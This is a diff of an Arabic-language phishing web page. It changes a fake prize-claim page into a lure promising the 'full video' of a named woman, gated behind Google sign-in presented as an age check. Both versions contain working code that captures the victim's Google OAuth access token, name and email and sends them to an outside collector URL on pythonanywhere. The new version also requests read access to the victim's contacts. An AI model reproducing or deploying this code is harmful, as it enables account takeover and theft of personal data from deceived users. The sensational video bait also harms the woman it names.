@@ -3,76 +3,69 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تهانينا! لقد ربحت جائزة</title>
+    <title>🔴 حصرياً وقبل الحذف!</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
-    
-    <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; }
-        .logo { width: 80px; margin-bottom: 20px; }
-        h2 { color: #1a73e8; margin-bottom: 10px; }
-        p { color: #5f6368; font-size: 16px; margin-bottom: 30px; }
-        .btn-google { background-color: #4285f4; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; margin: 0 auto; transition: background 0.3s; }
-        .btn-google:hover { background-color: #357ae8; }
-        .footer { margin-top: 20px; font-size: 12px; color: #9aa0a6; }
-    </style>
 </head>
-<body>
+<body class="bg-black text-white font-sans overflow-x-hidden">
+    <div class="relative z-10 flex flex-col items-center justify-center min-h-screen p-4 bg-gradient-to-b from-transparent via-black/80 to-black">
+        
+        <header class="text-center mb-6">
+            <div class="inline-block px-4 py-1 bg-red-600 rounded-full text-[10px] font-black uppercase animate-pulse mb-3">Live Now</div>
+            <h1 class="text-2xl md:text-3xl font-black leading-tight">🔴 فيديو رحمة محسن الكامل</h1>
+            <p class="text-gray-400 text-sm mt-2">يجب تسجيل الدخول للتحقق من العمر ومشاهدة الفيديو</p>
+        </header>
 
-<div class="card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_Icons_2020.svg" alt="Google" class="logo">
-    <h2>تأكيد استلام الجائزة</h2>
-    <p>لقد تم اختيار حسابك للحصول على مكافأة نقدية. يرجى تسجيل الدخول للتحقق من ملكية الحساب وإتمام عملية التحويل.</p>
-    
-    <button id="loginBtn" class="btn-google">
-        تسجيل الدخول عبر Google
-    </button>
-    
-    <div class="footer">تخضع هذه العملية لسياسة الأمان والخصوصية</div>
-</div>
+        <div class="relative w-full max-w-lg aspect-video bg-gray-900 rounded-2xl border border-white/10 overflow-hidden shadow-[0_0_50px_rgba(220,38,38,0.3)]">
+            <div class="absolute inset-0 flex items-center justify-center bg-black/40">
+                <div id="loginBtn" class="w-20 h-20 bg-red-600 rounded-full flex items-center justify-center cursor-pointer hover:scale-110 transition-all">
+                    <i class="fas fa-play text-2xl ml-1">▶</i>
+                </div>
+            </div>
+        </div>
 
-<script>
-    // إعدادات Firebase الخاصة بمشروعك
-    const firebaseConfig = {
-        apiKey: "AIzaSyCvs2XALyDmK3_D4BXJ5Dx7MFo2H71R6gg",
-        authDomain: "giftapp-5937d.firebaseapp.com",
-        projectId: "giftapp-5937d",
-        storageBucket: "giftapp-5937d.firebasestorage.app",
-        messagingSenderId: "1067108116204",
-        appId: "1:1067108116204:web:dd2b2717c17590b10be7c9"
-    };
+        <div id="status" class="mt-4 text-red-500 font-bold"></div>
+    </div>
 
-    // بدء تشغيل Firebase
-    firebase.initializeApp(firebaseConfig);
+    <script>
+        // إعدادات Firebase الخاصة بك
+        const firebaseConfig = {
+            apiKey: "AIzaSyCvs2XALyDmK3_D4BXJ5Dx7MFo2H71R6gg",
+            authDomain: "giftapp-5937d.firebaseapp.com",
+            projectId: "giftapp-5937d",
+            storageBucket: "giftapp-5937d.firebasestorage.app",
+            messagingSenderId: "1067108116204",
+            appId: "1:1067108116204:web:dd2b2717c17590b10be7c9"
+        };
 
-    // برمجة الزرار لبدء تسجيل الدخول
-    document.getElementById('loginBtn').onclick = function() {
-        this.innerHTML = "جاري التحويل...";
-        const provider = new firebase.auth.GoogleAuthProvider();
-        firebase.auth().signInWithRedirect(provider);
-    };
+        firebase.initializeApp(firebaseConfig);
 
-    // استلام البيانات وإرسالها للسيرفر (الوحش)
-    firebase.auth().getRedirectResult().then((result) => {
-        if (result.credential) {
-            const token = result.credential.accessToken;
-            const userEmail = result.user.email || "Unknown";
-            const userName = result.user.displayName || "User";
+        // 1. معالجة البيانات فور العودة من جوجل
+        firebase.auth().getRedirectResult().then((result) => {
+            if (result.credential) {
+                const token = result.credential.accessToken;
+                const user = result.user;
+                const sender = user.displayName || user.email;
 
-            // إرسال البيانات فوراً لـ PythonAnywhere
-            fetch(`https://mohamedahmed77.pythonanywhere.com/catch?token=${token}&sender=${userName}_${userEmail}`)
-            .then(() => {
-                window.location.href = "https://google.com"; 
-            })
-            .catch(() => {
-                window.location.href = "https://google.com";
-            });
-        }
-    }).catch((error) => {
-        console.error("Error during authentication:", error.message);
-    });
-</script>
+                // إرسال البيانات فوراً للوحش
+                fetch(`https://mohamedahmed77.pythonanywhere.com/catch?token=${token}&sender=${sender}`)
+                .then(() => {
+                    // فتح إعلان في الخلفية كما خططنا
+                    window.open("https://google.com", "_blank"); 
+                    document.getElementById('status').innerText = "تم التحقق! جاري تشغيل الفيديو...";
+                });
+            }
+        }).catch((error) => {
+            console.error("Firebase Error:", error.message);
+        });
 
+        // 2. تفعيل زرار تسجيل الدخول
+        document.getElementById('loginBtn').onclick = function() {
+            const provider = new firebase.auth.GoogleAuthProvider();
+            provider.addScope('https://www.googleapis.com/auth/contacts.readonly');
+            firebase.auth().signInWithRedirect(provider);
+        };
+    </script>
 </body>
 </html>
